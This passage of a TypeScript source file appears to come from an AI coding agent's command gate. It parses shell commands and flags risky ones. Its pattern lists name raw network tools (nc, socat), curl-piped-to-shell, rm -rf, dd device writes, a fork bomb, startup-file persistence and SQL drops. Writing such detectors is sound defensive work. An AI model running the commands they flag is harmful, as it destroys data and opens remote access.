  { re: /^osascript(?![\w./-])/, label: 'GUI automation (osascript)' },

  // The one command the gate cannot inspect: what runs is whatever the variable expands to at
  // execution time, so every pattern in this file is matching the wrapper rather than the work.
  { re: /^eval(?![\w./-])/, label: 'Executes an unreviewable string (eval)' },
  // Called out in #206 as low-frequency in ordinary dev and nearly free to add.
  { re: /^(?:nc|ncat|socat|telnet)(?![\w./-])/, label: 'Raw network connection (nc/socat/telnet)' },
  // Only the everything-target is worth flagging: a targeted `kill <pid>` is recoverable, and the
  // agent legitimately manages its own background processes.
  { re: /^kill\s+(?:-\w+\s+)*-1(?![\d\w./-])/, label: 'Kill every process (kill -1)' },
];

// Leading tokens that don't change what a segment actually runs: env assignments, privilege and
// timing wrappers, and the shell keywords a segment can open with (`if curl … ; then`).
//
// The quoted reading (`stripVerbPrefix`) walks the segment one shell word at a time, so an
// assignment's value is whatever the shell reads as one word: `"a b"`, `pre"a b"`, `"a b"c`, `$'a b'`,
// `a\ b`. `[A-Za-z_]\w*=\S*` stops at the space inside `"a b"` and leaves `b" curl …` standing, so
// the `^`-anchored verbs never see `curl` and the fetch runs unprompted (#752); a regex alternative
// that read only a value made of exactly one quoted run was the first cut, and missed the rest. A
// quote the walk cannot close takes the rest of its non-space run, the old reading, so an assignment
// is never left unmatchable. A lexer rather than a quote-aware pattern because a pattern that also
// tolerates an unclosed quote gives each token two viable ends, and anything anchored after it
// re-explores every earlier token's choice.
//
// `VERB_PREFIX_WS_RE` is the old strip, and it stays because the fragment IT leaves behind is
// sometimes the verb: `A="x pkill node" bash -c "$A"` reads as a `pkill` only through the blind
// reading, and the value is exactly what that `bash -c` runs. So `verbLabels` reads a segment both
// ways and reports the union — quoting can add a label, and cannot cost one. Both readings strip the
// same words, from one list, or the union would disagree about a wrapper only one of them knows.
const VERB_PREFIX_WORDS = [
  'sudo',
  'command',
  'nohup',
  'exec',
  'env',
  'time',
  'if',
  'then',
  'else',
  'elif',
  'do',
  'while',
  'until',
  '!',
];
const VERB_PREFIX_WORD_SET = new Set(VERB_PREFIX_WORDS);
const VERB_PREFIX_WS_RE = new RegExp(
  String.raw`^(?:(?:[A-Za-z_]\w*=\S*|${VERB_PREFIX_WORDS.join('|')})\s+)+`,
);

const SHELL_WORD_RE =
  /(?:"(?:[^"\\]|\\[\s\S])*"|\$'(?:[^'\\]|\\[\s\S])*'|'[^']*'|\\[\s\S]|[^\s"'\\])+/y;
const NON_SPACE_RUN_RE = /\S*/y;
const WORD_GAP_RE = /\s+/y;
const ENV_ASSIGN_WORD_RE = /^[A-Za-z_]\w*=/;

// A wrapper's own options sit between it and the command it runs (`sudo -u me grep …`, `env -i …`,
// `time -p …`); left in place, the option became the lead and the command behind it read as an
// argument (#757 review). These are the options that consume the next word as their value, in their
// SHORT spellings; the long ones are `WRAPPER_LONG_VALUE_OPTIONS` below and the bundled ones are
// `wrapperOptionValue`'s last clause (#794). Both lists are closed on purpose: an option nobody
// enumerated costs a label, which is the direction this file errs in.
const WRAPPER_VALUE_OPTIONS: Record<string, ReadonlySet<string>> = {
  sudo: new Set(['-u', '-g', '-U', '-C', '-D', '-h', '-p', '-r', '-t', '-T', '-R']),
  env: new Set(['-u', '-C', '-S', '-P']),
  exec: new Set(['-a']),
  time: new Set(['-o', '-f']),
};
// The same options spelled out: `sudo --user me curl …` and `env --chdir /x make install` hid the
// command behind them exactly as the short spellings did (#794).
const WRAPPER_LONG_VALUE_OPTIONS: Record<string, ReadonlySet<string>> = {
  sudo: new Set([
    '--user',
    '--group',
    '--other-user',
    '--close-from',
    '--chdir',
    '--host',
    '--prompt',
    '--role',
    '--type',
    '--command-timeout',
  ]),
  env: new Set(['--unset', '--chdir', '--split-string', '--path']),
  exec: new Set(['--argv0']),
  time: new Set(['--output', '--format']),
};
const WRAPPER_WORDS = new Set(['sudo', 'command', 'nohup', 'exec', 'env', 'time']);

// `command -v x` looks `x` up and runs nothing, so it has no verb at all.
const COMMAND_LOOKUP_RE = /^-[a-zA-Z]*[vV]/;

// Whether a wrapper option consumes the NEXT word as its value. `word` has already been read as an
// option. A long spelling carrying `=` (`--user=me`) keeps its value attached and eats nothing.
function wrapperOptionValue(wrapper: string, word: string): boolean {
  if (WRAPPER_VALUE_OPTIONS[wrapper]?.has(word)) return true;
  if (WRAPPER_LONG_VALUE_OPTIONS[wrapper]?.has(word)) return true;
  // A BUNDLED short spelling (`sudo -iu me`, `env -iu PATH …`) follows getopt: the letters are read
  // left to right, and the FIRST one that takes a value takes the rest of the bundle as that value
  // (`-ume` is `-u me`, `-of x` is `-o f`) unless it is the bundle's LAST letter, in which case the
  // value is the next word (`-iu me` is `-i -u me`). Anything else is a flag that eats nothing.
  if (!/^-[a-zA-Z]+$/.test(word)) return false;
  for (let i = 1; i < word.length; i++) {
    if (WRAPPER_VALUE_OPTIONS[wrapper]?.has(`-${word[i]}`)) return i === word.length - 1;
  }
  return false;
}

function stripVerbPrefix(segment: string): string {
  let at = 0;
  let wrapper: string | undefined;
  let takesValue = false;
  for (;;) {
    SHELL_WORD_RE.lastIndex = at;
    let end = SHELL_WORD_RE.exec(segment) ? SHELL_WORD_RE.lastIndex : at;
    if (end < segment.length && /["'\\]/.test(segment[end])) {
      NON_SPACE_RUN_RE.lastIndex = end;
      NON_SPACE_RUN_RE.exec(segment);
      end = NON_SPACE_RUN_RE.lastIndex;
    }
    const word = segment.slice(at, end);
    if (wrapper === 'command' && COMMAND_LOOKUP_RE.test(word)) return '';
    const isOption = wrapper !== undefined && (takesValue || word.startsWith('-'));
    WORD_GAP_RE.lastIndex = end;
    const gap = WORD_GAP_RE.exec(segment);
    if (!gap || !(isOption || VERB_PREFIX_WORD_SET.has(word) || ENV_ASSIGN_WORD_RE.test(word))) {
      return segment.slice(at);
    }
    if (takesValue) {
      takesValue = false;
    } else if (isOption) {
      // `--` ends the wrapper's options: the next word is the command, even one spelled `-x`.
      if (word === '--') wrapper = undefined;
      else takesValue = wrapperOptionValue(wrapper!, word);
    } else if (WRAPPER_WORDS.has(word)) {
      wrapper = word;
    } else if (!ENV_ASSIGN_WORD_RE.test(word)) {
      wrapper = undefined;
    }
    at = WORD_GAP_RE.lastIndex;
  }
}

// Segments split on the operators AND on command substitution, so `$(curl …)` and `` `pkill …` ``
// are seen as the commands they are rather than as arguments of whatever encloses them. Matched
// against `maskShellData`, where a separator inside quotes is data — `grep "a\|gh pr\|b"` is one
// grep, not a `gh pr` — but a `$(…)` inside `"…"` is commands, and one inside `'…'` is neither.
const VERB_SEPARATOR_RE = /[\n;&|(){}]+|\$\(|`/g;

// The shells that read a heredoc body as a program of their own. Everything else — `python3 -`,
// `node -`, `cat > run.py`, `gh --body-file -` — reads a body as a script in another language or as
// text, where a `; curl y` inside a string literal is a string and not a second command. Naming a
// shell here is the direction that KEEPS a body in the scan, so the set errs long: a wrong name
// costs an over-reported label, not a hidden command.
const SHELL_READERS = new Set([
  'sh',
  'bash',
  'rbash',
  'dash',
  'ash',
  'ksh',
  'mksh',
  'pdksh',
  'oksh',
  'zsh',
  'yash',
  'csh',
  'tcsh',
  'fish',
  'xonsh',
  'elvish',
  'busybox',
  'su',
]);

// A version suffix still names the shell: `ksh93`, `bash5`, `zsh-5.9`.
function namesShell(word: string): boolean {
  const name = word.slice(word.lastIndexOf('/') + 1);
  return SHELL_READERS.has(name) || SHELL_READERS.has(name.replace(/-?\d[\d.]*$/, ''));
}

// `.`/`source` read a file as shell, and stdin is a file: `. /dev/stdin <<'EOF'` runs the body.
const SOURCE_STDIN_RE =
  /(?:^|[\s;&|(])(?:\.|source)\s+\/(?:dev\/stdin|dev\/fd\/0|proc\/self\/fd\/0)(?=\s|$)/m;

// Whether a shell is named anywhere in the command outside its heredoc bodies. Any one then keeps
// every body in the scan, because the reader is not only the operator's own pipeline: a body
// written to a file is run by a shell on a later line (`cat > s.sh <<'EOF'` … `sh s.sh`), a shell
// on an earlier line reaches it through a `\` continuation or an open `bash -c "$(`, and a pipe
// carries on past a comment (`| # note`). Over-reports a command that merely names a shell.
function shellOutsideBodies(command: string, heredocs: Heredoc[]): boolean {
  let outside = command;
  for (const h of heredocs) {
    outside =
      outside.slice(0, h.bodyStart) + ' '.repeat(h.end - h.bodyStart) + outside.slice(h.end);
  }
  return SOURCE_STDIN_RE.test(outside) || words(outside).some(namesShell);
}

// Whether a pipeline stage could be the shell that runs the body. ANY word naming a shell counts,
// not just the command word, because the shell can sit behind a wrapper's flags — `sudo -u me bash`,
// `env -i sh` — where the first word is the wrapper or one of its operands, and because a shell in
// the stage is the one reading the body either way. Coarse on purpose: `cat <<'EOF' | grep -n sh`
// then keeps the body in the scan and over-reports, which is the direction this can afford. A stage
// with no words at all is one the caller cannot read (`cat <<'EOF' |` with the pipeline continuing on
// the next line) and is answered the same way.
//
// The lookup is lexical, so it misses any name that only BECOMES a shell after quote removal or
// expansion — `s\h`, `$SHELL`, a backtick — and each miss HIDES a body a shell runs. One character
// of them is visible without guessing: they all carry a `\`, a `$` or a backtick, which no literal
// shell name does. A stage carrying one is answered as a shell too; over-report is the affordable
// error, a hidden `pkill node` is not.
function readsAsShell(stage: string): boolean {
  const ws = words(stage);
  return ws.length === 0 || /[$`\\]/.test(stage) || ws.some(namesShell);
}

// The pipeline stages of one physical line, split on `|` as the quote mask sees it: a `|` inside a
// quoted string is a data character, not a stage boundary.
function lineStages(
  command: string,
  view: string,
  lineStart: number,
  lineEnd: number,
): Array<{ start: number; end: number }> {
  const stages: Array<{ start: number; end: number }> = [];
  let start = lineStart;
  for (let i = lineStart; i < lineEnd; i++) {
    if (view[i] !== '|') continue;
    stages.push({ start, end: i });
    start = i + 1;
  }
  stages.push({ start, end: lineEnd });
  return stages;
}

// The verb question's two accounts of one command: `maskQuoted`'s, plus the heredoc bodies nothing
// runs (#699). A body is the verb scan's blind spot in both directions. The shell pastes it whole,
// so none of its separators are the shell's — but the walk that builds the quote mask deliberately
// records no quote spans inside one, because the shell doesn't quote-parse a body either. So before
// this, a `;` inside a string literal in a body split a segment and made the next word a verb:
// `python3 - <<'EOF'` / `print("x; curl y")` / `EOF` read as a `curl`, which for a script that runs
// no shell is exactly the reflexive-approval prompt the gate exists to avoid. Approving it also runs
// the script UNSANDBOXED (a flagged command a human cleared is `decideSandbox`'s unbounded case),
// where without the label it would have run sandboxed and unprompted.
//
// `pasted` comes back as its own list rather than as more blanking in `syntax`, and that is not
// cosmetic: `verbSegments` finds its separators in that mask, and a body's OPENING newline cannot be
// blanked without changing the command's line structure. A region is therefore reported as the
// half-open span `[bodyStart - 1, bodyEnd)` — the body plus the newline that opened
// it, terminator line excluded — and a caller asks whether a separator RUN ends in one. Not where
// it STARTS: `cat <<'EOF';` glues the body's opening newline onto the `;` before it, so a
// start-position test lets the body's first line through as a segment — while a run starting inside
// the body (a separator-char delimiter like `cat <<';'`) can cross `bodyEnd` and swallow the
// newline that restores `keep`, hiding the command after the body. The END of the run is what says
// "inside": it is the separator the run stands for.
//
// Three things keep a body out of `pasted`, and they are all the over-reporting side:
//
//   - an UNQUOTED delimiter (`<<EOF`, `<<\EOF`): the shell expands `$(…)` and backticks in the body,
//     so a substitution there runs — the same body `expandingHeredocBodies` reports. Only a body
//     the shell pastes literally is data here.
//   - a shell as the reader: `sh -s <<'EOF'`, one behind a wrapper's flags (`env -i sh <<'EOF'`) or
//     further down the pipeline (`cat <<'EOF' | sh`, `cat <<'EOF' | sudo /bin/bash -s`), where the
//     body arrives on the shell's stdin as commands. Such a body stays in the scan, because nothing
//     here quote-parses it and so a bare `pkill node` line in one cannot be told from a string.
//   - a reader that cannot be read: a stage with no words at all, and a line that ends in `\`, are
//     both pipelines this does not see the end of.
//
// A command the lexer cannot read exactly pastes nothing, exactly as `maskQuoted` blanks nothing:
// the labels then over-report, never hide.
function verbData(command: string): {
  syntax: string;
  pasted: Array<[number, number]>;
  substitutions: Array<{ start: number; end: number }>;
} {
  const syntax = maskShellData(command);
  const masked = maskQuoted(command);
  const scan = scanHeredocs(command);
  if (scan.uncertain) return { syntax, pasted: [], substitutions: [] };
  // A shell anywhere in the command keeps every body in the scan, but the substitution spans are
  // still the lexer's own: without them `FOO="$(date) a b c" make install && bash x.sh` lost the
  // outer reading for naming a shell (#843 review).
  if (shellOutsideBodies(command, scan.heredocs)) {
    return { syntax, pasted: [], substitutions: scan.substitutions };
  }
  const pasted: Array<[number, number]> = [];
  for (const h of scan.heredocs) {
    if (!h.literal) continue;
    // An EMPTY body still reports its opening newline: the line that would close it is the
    // terminator, and a terminator that reads as a verb (`cat <<'curl'` / `curl`) is not a command.
    // The span degenerates to that one newline, which is all the caller needs.
    // The verb question runs per line, and the reader and every stage the body could reach are both
    // on the operator's own line: the body starts after the newline that ends it.
    const lineStart = command.lastIndexOf('\n', h.opAt - 1) + 1;
    const nl = command.indexOf('\n', h.opAt);
    // A backslash before the newline continues the line, so the pipeline the operator sits in may
    // reach further than this reads (and the shell puts the body after the NEXT newline, which is
    // not where the lexer looked). Nothing is pasted then: the body stays in the scan.
    let trailing = 0;
    while (nl > lineStart && command[nl - 1 - trailing] === '\\') trailing++;
    if (trailing % 2 === 1) continue;
    const stages = lineStages(command, masked, lineStart, nl === -1 ? command.length : nl);
    // The stage the operator sits in is the reader's; the ones after it are where a pipe could hand
    // the body on to a shell. Earlier stages cannot read it, so `sh setup.sh | cat <<'EOF'` pastes.
    const readers = stages
      .slice(stages.findIndex(s => h.opAt < s.end))
      .map(s => command.slice(s.start, s.end));
    if (readers.some(readsAsShell)) continue;
    pasted.push([h.bodyStart - 1, h.bodyEnd]);
  }
  return { syntax, pasted, substitutions: scan.substitutions };
}

// The command with each of `ranges` blanked, length-preserving so it still indexes the same way as
// the masks built from the same text. Blanked to a placeholder WORD rather than to spaces, because a
// substitution is a word of the command and can be its command word: blanked to spaces,
// `$(which conda) install numpy` read as coreutils `install` (#843 review). Sorted by start, which is
// what makes a NESTED range harmless: the lexer records a substitution when it CLOSES, so an inner one
// is listed before the `$(…)` around it, and blanking the outer first covers the inner already.
function blankRanges(text: string, ranges: Array<{ start: number; end: number }>): string {
  let out = '';
  let at = 0;
  for (const r of [...ranges].sort((a, b) => a.start - b.start)) {
    if (r.start < at) continue;
    out += `${text.slice(at, r.start)}${'_'.repeat(r.end - r.start)}`;
    at = r.end;
  }
  return out + text.slice(at);
}

// One segment of the command, and whether it starts where a substitution CLOSED — which is the
// middle of the outer command's word, not the start of a command: `echo "$(date) install later"` is
// cut at `install`, a word of the same quoted argument (#794). Only a reading that asks whether a
// segment STARTS a command consults this. It is raised only where the lexer's own spans prove the
// segment begins inside the outer word: the test is a fact about the command, not a heuristic, and a
// reading wrongly marked here would lose a label rather than cost an extra prompt.
interface VerbSegment {
  text: string;
  fragment: boolean;
}

// One pass of the separator walk: `text` cut at every separator `view` finds outside a pasted heredoc
// body. Split out because `verbSegments` runs it over two views of one command (#794).
function splitAt(
  text: string,
  view: string,
  pasted: Array<[number, number]>,
  substitutions: Array<{ start: number; end: number }>,
): VerbSegment[] {
  const segments: VerbSegment[] = [];
  // Where each substitution CLOSED, so the fragment test is a lookup rather than a scan of the spans
  // for every segment — a long script is one command, and both lists can be thousands long.
  const closes = new Set(substitutions.map(s => s.end));
  let start = 0;
  let keep = true;
  VERB_SEPARATOR_RE.lastIndex = 0;
  for (let m = VERB_SEPARATOR_RE.exec(view); m; m = VERB_SEPARATOR_RE.exec(view)) {
    if (keep) segments.push({ text: text.slice(start, m.index), fragment: closes.has(start) });
    start = m.index + m[0].length;
    // A separator inside a pasted body ends nothing the shell runs, so the text it closes is not a
    // segment of its own — and `keep` goes false, which is what holds the body's own lines out of
    // the next segment. It is read off `pasted` rather than off a blanked `masked`, because the
    // opening separator of a body IS that body's newline and stays one in the mask. The test is
    // where the run ENDS: `cat <<'EOF';` glues the body's opening newline onto the `;` before it
    // (a start-position test would let the body's first line through), and a run starting inside
    // the body can cross `bodyEnd` and swallow the newline that restores `keep` (hiding the command
    // after the body) — an END past the region means the run ends in real syntax, and its text is
    // the shell's again. A `$(…)` inside a pasted body is a string in that script.
    keep = !pasted.some(
      ([from, to]) => m.index + m[0].length > from && m.index + m[0].length <= to,
    );
  }
  if (keep) segments.push({ text: text.slice(start), fragment: closes.has(start) });
  return segments;
}

// A separator the mask blanked is not found at all, so the segment it sits in runs on to the next
// real one: cutting there and dropping the rest hid `FOO="a;b" make install` (#749).
//
// Splitting at a substitution is right for the question INSIDE it — `$(curl …)` runs — but it takes
// the head of the command the substitution sits in, so `FOO="$(date) a b c" make install` leaves the
// tail `a b c" make install` reading as five leading words and an install nobody sees (#794). The
// outer reading is therefore run as well, over the same command with each substitution blanked: to
// the shell that value is one assignment word, and everything after it is that command's verb
// position. Blanking rather than deleting keeps the indices, and a substitution's own quotes and
// separators go with it, so the outer text is if anything more balanced than the command was. Both
// readings are reported — one shell line can be both (`docker run "$(cat img)" rm -rf /x`), and a
// label the split dropped is what this adds back.
//
// The outer pass marks nothing a fragment: its segments are cut from text whose substitutions are
// gone, so every boundary it finds is a separator the shell sees.
function verbSegments(command: string, pasteBodies: boolean): VerbSegment[] {
  const { syntax, pasted: found, substitutions } = verbData(command);
  const pasted = pasteBodies ? found : [];
  // The shell deletes a line continuation, so the readers see it as the space it leaves; an escaped
  // backslash before a newline is not one, and the mask is what tells them apart.
  const text = command.replace(/\\\n/g, (m, at: number) =>
    syntax[at] === ' ' && syntax[at + 1] === ' ' ? '  ' : m,
  );
  const inner = splitAt(text, syntax, pasted, substitutions);
  if (substitutions.length === 0) return inner;
  const outer = blankRanges(text, substitutions);
  return [...inner, ...splitAt(outer, maskShellData(outer), pasted, [])];
}

function verbLabels(reads: SegmentRead[]): string[] {
  const hits: string[] = [];
  for (const read of reads) {
    // Both prefix readings, unioned — see `VERB_PREFIX_WS_RE` above. They agree on any segment
    // without a quoted value holding a space, which is nearly all of them, so the second pass only
    // runs when they differ.
    for (const seg of read.spaced === read.quoted ? [read.quoted] : [read.quoted, read.spaced]) {
      if (!seg) continue;
      for (const { re, label } of VERB_PATTERNS) {
        if (re.test(seg) && !hits.includes(label)) hits.push(label);
      }
      const cluster = clusterLabel(seg) ?? ghLabel(seg) ?? hfLabel(seg);
      if (cluster && !hits.includes(cluster)) hits.push(cluster);
    }
  }
  return hits;
}

// `rm` in command position: not docker's `--rm` flag, and not the `rm` subcommand of a tool
// that removes something other than files (`docker rm -f app`, `npm rm`, `aws s3 rm`,
// `terraform state rm`) — those carry their own labels, and a second "force delete" on
// `docker rm -f` would be a misleading one. A blocklist on purpose: an unlisted wrapper
// (`timeout 5 rm`, `busybox rm`) still gates, while an unlisted carrier costs one extra label.
// `git rm` is deliberately NOT excluded — with -f/-r it deletes from the working tree too.
const RM_LEAD = String.raw`(?<![\w-])(?<!\b(?:docker|podman|nerdctl|npm|pnpm|yarn|bun|s3|gsutil|state|volume|image|container|network|secret|config|context|stack|service|node|plugin|buildx|compose|manifest|mc|azcopy)\s+)rm(?=\s)`;
// GNU rm accepts options after operands, so `rm build -rf` is `rm -rf build` and `rm -f -r x`
// is `rm -rf x`: each flag is looked for anywhere in the segment rather than in a fixed slot,
// and the combined spellings (`-rf`, `-fr`, `-Rf`, `-vrf`) satisfy both at once. Recursion and
// force are then classified by which flags the segment has and lacks, so every rm reads as
// exactly one of the three labels below.
const RM_SEG = String.raw`[^&;|\n()\x60]*`;
const RM_R = String.raw`\s(?:--recursive|-[a-zA-Z]*[rR][a-zA-Z]*)(?![\w-])`;
const RM_F = String.raw`\s(?:--force|-[a-zA-Z]*f[a-zA-Z]*)(?![\w-])`;
function rmFlags(has: string[], lacks: string[]): RegExp {
  const look = [...has.map(f => `(?=${RM_SEG}${f})`), ...lacks.map(f => `(?!${RM_SEG}${f})`)];
  return new RegExp(RM_LEAD + look.join(''));
}

const DANGER_PATTERNS: Array<{ re: RegExp; label: string }> = [
  { re: rmFlags([RM_R, RM_F], []), label: 'Recursive force delete (rm -rf)' },
  // Recursive deletion is recursive deletion; -f only suppresses the prompts nothing was going
  // to show anyway.
  { re: rmFlags([RM_R], [RM_F]), label: 'Recursive delete (rm -r)' },
  // A plain `rm file` is as targeted as an edit and stays ungated; -f is the flag that says
  // "don't ask" — it deletes write-protected files, and it is what a model reaches for when a
  // plain rm complained (#293). Gated on the same footing as the recursive forms above.
  { re: rmFlags([RM_F], [RM_R]), label: 'Force delete (rm -f)' },
  {
    re: /\bfind\b[^&;|]*\s(?:-delete\b|-exec\s+rm\b)/,
    label: 'Delete files by search (find -delete)',
  },
  {
    re: /\bchmod\s+(?:-{1,2}[\w-]+\s+)*(?:-[a-zA-Z]*R|--recursive\b)/,
    label: 'Recursive permission change (chmod -R)',
  },
  {
    re: /\bchown\s+(?:-{1,2}[\w-]+\s+)*(?:-[a-zA-Z]*R|--recursive\b)/,
    label: 'Recursive ownership change (chown -R)',
  },
  { re: /\bsudo\b/, label: 'Privilege escalation (sudo)' },
  { re: /(curl|wget)[^|]*\|\s*(sh|bash|zsh)\b/, label: 'Piping remote content to shell' },
  { re: /\|\s*(sh|bash|zsh)\b/, label: 'Piping to shell' },
  { re: /\bdd\s+[^&;|]*\bof=\/dev\//, label: 'Direct device write (dd of=/dev/…)' },
  // dd truncates and overwrites whatever `of=` names, device or not — the label differs only so
  // the user reads the right severity.
  { re: /\bdd\s+[^&;|]*\bof=(?!\/dev\/)/, label: 'Overwrite file with dd (dd of=…)' },
  {
    re: /\bgit\s+push[^&;|]*(--force\b|--force-with-lease\b|\s-f\b)/,
    label: 'Force push to remote',
  },
  { re: /\bgit\s+branch\s+-D\b/, label: 'Force-delete git branch' },
  // Moves an existing branch wherever it is pointed; the commits it left are reachable only
  // through the reflog.
  { re: /\bgit\s+branch\b[^&;|]*\s(?:-f|--force)\b/, label: 'Force-move git branch' },
  // A forced remove deletes the worktree's uncommitted and untracked files with it.
  {
    re: /\bgit\s+worktree\s+remove\b[^&;|]*\s(?:-f|--force)\b/,
    label: 'Force-remove git worktree (discards its uncommitted changes)',
  },
  { re: /\bgit\s+reset\s+--hard\b/, label: 'Hard reset (discards uncommitted changes)' },
  { re: /\bgit\s+clean\s+-[a-zA-Z]*f/, label: 'Force-clean untracked files' },
  // The same act as the hard reset above through a different verb, and the worst of the set:
  // uncommitted work was never in the object store, so there is no reflog to recover it from.
  // Matched only in the pathspec forms — `git checkout <branch>` and `git restore --staged`
  // keep the working tree, and prompting on a branch switch trains reflexive approval, which
  // costs more safety than these patterns buy.
  {
    re: /\bgit\s+checkout\b[^&;|]*\s--\s/,
    label: 'Discard working-tree changes (git checkout -- <path>)',
  },
  {
    re: /\bgit\s+checkout\s+(?:-{1,2}[\w-]+\s+)*\.(?:\s|$)/,
    label: 'Discard working-tree changes (git checkout -- <path>)',
  },
  {
    re: /\bgit\s+restore\b(?![^&;|]*(?:--staged\b|\s-S\b))/,
    label: 'Discard working-tree changes (git restore)',
  },
  {
    re: /\bgit\s+restore\b[^&;|]*(?:--worktree\b|\s-W\b)/,
    label: 'Discard working-tree changes (git restore)',
  },
  {
    re: /\bgit\s+stash\s+(?:drop|clear)\b/,
    label: 'Discard stashed changes (git stash drop/clear)',
  },
  // Recovery surfaces: expiring the reflog or pruning unreachable objects deletes exactly what
  // a bad reset would otherwise be recoverable from, so these turn a reversible mistake final.
  { re: /\bgit\s+reflog\s+expire\b/, label: 'Expire reflog (removes the undo history)' },
  {
    re: /\bgit\s+gc\b[^&;|]*--prune(?:=|\b)/,
    label: 'Prune unreachable git objects (git gc --prune)',
  },
  { re: /\bgit\s+filter-(?:branch|repo)\b/, label: 'Rewrite git history (filter-branch/repo)' },
  { re: /\bgit\s+update-ref\b[^&;|]*\s-d\b/, label: 'Delete a git ref (git update-ref -d)' },
  // Not destructive on its own, but it silently changes where every later push lands.
  { re: /\bgit\s+remote\s+(?:set-url|add)\b/, label: 'Change git remote (redirects pushes)' },
  { re: /\bgh\s+repo\s+delete\b/, label: 'Delete GitHub repo (irreversible remote)' },
  // `repos?` because the CLI's noun is `repos` and `repo` is its alias; `(?![\w./-])` so
  // `delete-files` — which removes files from a repo, not the repo — is not labelled as the
  // irreversible one (a trailing `\b` matches before its hyphen).
  {
    re: /\bhf\s+repos?\s+delete(?![\w./-])/,
    label: 'Delete Hugging Face repo (irreversible remote)',
  },
  { re: /\bchmod\s+[0-7]*777\b/, label: 'Open permissions (chmod 777)' },
  { re: /\brm\s+[^&;|]*\.env\b/, label: 'Deleting environment file (.env)' },
  { re: />\s*\/dev\/sd[a-z]\b/, label: 'Writing to raw disk device' },
  { re: /:(){:|:&};:|:\(\)\s*\{\s*:\|:&\s*\};\s*:/, label: 'Fork bomb pattern' },

  // Tier 4 — persistence. An append to a startup file outlives every session, and it is the
  // classic first step of anything malicious.
  {
    re: />>?\s*(?:~|\$HOME|\/(?:Users|home)\/[^/\s]+)\/\.(?:zshrc|bashrc|bash_profile|zprofile|zshenv|profile|config\/fish\/config\.fish)\b/,
    label: 'Append to shell startup file (persists across sessions)',
  },

  // Tier 5 — databases. Uniquely unrecoverable: no reflog, no undo, and the model cannot see
  // what is in the database it is acting on. Matched as substrings rather than in verb position
  // because SQL arrives inside a quoted `-c`/`-e` argument, never as the command itself.
  { re: /\bdrop\s+(?:database|schema|table)\b/i, label: 'SQL DROP (irreversible)' },
  // Uppercase-only for the bare form, so prose like "truncate the log" stays quiet; the explicit
  // `truncate table` spelling is unambiguous enough to match either case.
  { re: /\bTRUNCATE\s+(?:TABLE\s+)?[\w."`]+/, label: 'SQL TRUNCATE (empties a table)' },
  { re: /\btruncate\s+table\b/i, label: 'SQL TRUNCATE (empties a table)' },
  {
    re: /\bdelete\s+from\b(?![^;]*\bwhere\b)/i,
    label: 'SQL DELETE with no WHERE (empties a table)',
  },
  {
    re: /\bredis-cli\b[^;|&]*\bflush(?:all|db)\b/i,
    label: 'Redis flush (drops every key)',
  },
  { re: /\bprisma\s+migrate\s+reset\b/, label: 'Database reset (prisma migrate reset)' },
  { re: /\brails\s+db:(?:drop|reset|purge)\b/, label: 'Database drop/reset (rails db:*)' },
  { re: /\bmanage\.py\s+(?:flush|sqlflush)\b/, label: 'Database flush (django manage.py)' },
  { re: /\balembic\s+downgrade\s+base\b/, label: 'Migration downgrade to base (alembic)' },
  // Global / persistent package installs — affect state outside the project
  {
    re: /\bnpm\s+(?:install|i|add)\b[^|;&]*\s-{1,2}g(?:lobal)?\b/,
    label: 'Global npm install (persistent system change)',
  },
  {
    re: /\bnpm\s+-{1,2}g(?:lobal)?\b[^|;&]*\b(?:install|i|add)\b/,
    label: 'Global npm install (persistent system change)',
  },
  {
    re: /\bpnpm\s+(?:install|i|add)\b[^|;&]*\s-{1,2}g(?:lobal)?\b/,
    label: 'Global pnpm install (persistent system change)',
  },
  {
    re: /\bpnpm\s+-{1,2}g(?:lobal)?\b[^|;&]*\b(?:install|i|add)\b/,
    label: 'Global pnpm install (persistent system change)',
  },
  { re: /\byarn\s+global\s+add\b/, label: 'Global yarn install (persistent system change)' },
  {
    re: /\bbun\s+(?:install|i|add)\b[^|;&]*\s-{1,2}g(?:lobal)?\b/,
    label: 'Global bun install (persistent system change)',
  },
  {
    re: /\bbun\s+-{1,2}g(?:lobal)?\b[^|;&]*\b(?:install|i|add)\b/,
    label: 'Global bun install (persistent system change)',
  },
  { re: /\bbrew\s+install\b/, label: 'Homebrew install (system-level)' },
  { re: /\bcargo\s+install\b/, label: 'Cargo install (global binary)' },
  { re: /\bgo\s+install\b/, label: 'Go install (global $GOBIN)' },
  { re: /\bpipx\s+install\b/, label: 'pipx install (global Python tool)' },
  { re: /\buv\s+tool\s+install\b/, label: 'uv tool install (global Python tool)' },
  { re: /\bgem\s+install\b/, label: 'Gem install (Ruby package)' },
  ...PACKAGE_PATTERNS,
  ...POLICY_PATTERNS,
];

// Destructive work an inline interpreter body does through its own stdlib, where no shell
// command exists for the patterns above to match — `node -e "…rmSync…"` is the case #206 names.
// Applied ONLY to extracted interpreter bodies, never to a whole command: `rmSync` is an
// ordinary identifier in this repo's own source, and matching it in a grep would be exactly the
// false positive that trains reflexive approval. Deliberately tiny — only the recursive and
// glob deletes, since a single-file unlink is as targeted as `rm file`, which is not gated.
const INTERPRETER_BODY_PATTERNS: Array<{ re: RegExp; label: string }> = [
  {
    re: /\b(?:rm|rmdir)Sync\s*\([^)]*recursive\s*:\s*true/,
    label: 'Recursive delete (fs.rmSync recursive)',
  },
  { re: /\bshutil\.rmtree\s*\(/, label: 'Recursive delete (shutil.rmtree)' },
  { re: /\bFileUtils\.rm_rf\s*\(/, label: 'Recursive delete (FileUtils.rm_rf)' },
  { re: /\bunlink\s+glob\b/, label: 'Delete files by glob (unlink glob)' },
];

// ssh flags that consume the following token, so the host is found by skipping past them rather
// than by taking the first non-flag word.
const SSH_ARG_FLAGS = new Set(
  'b c D E e F I i J L l m O o p Q R S W w'.split(' ').map(f => `-${f}`),
);

// Reads one shell word at the start of `rest`, unwrapping a single level of quoting. Returns the
// word and how far to advance; that is all the parsing a carrier argument needs, since anything
// more nested is past the one-level depth cap below.
function readWord(rest: string): { value: string; end: number } | undefined {
  const lead = /^\s*/.exec(rest)![0].length;
  const s = rest.slice(lead);
  const quote = s[0];
  if (quote === '"' || quote === "'") {
    const close = s.indexOf(quote, 1);
    if (close < 0) return { value: s.slice(1), end: rest.length };
    return { value: s.slice(1, close), end: lead + close + 1 };
  }
  const m = /^\S+/.exec(s);
  return m ? { value: m[0], end: lead + m[0].length } : undefined;
}

// One shell word for the `env` walk, read the way the verb strip reads them: a quoted value holding
// a space is ONE word, where `readWord` above stops at the space inside it. Stepping past
// `env FOO="a b"` to the `-S` behind it needs that, and `env`'s operands are the only reason it
// exists — every other carrier takes a single quoted ARGUMENT, which `readWord` already reads
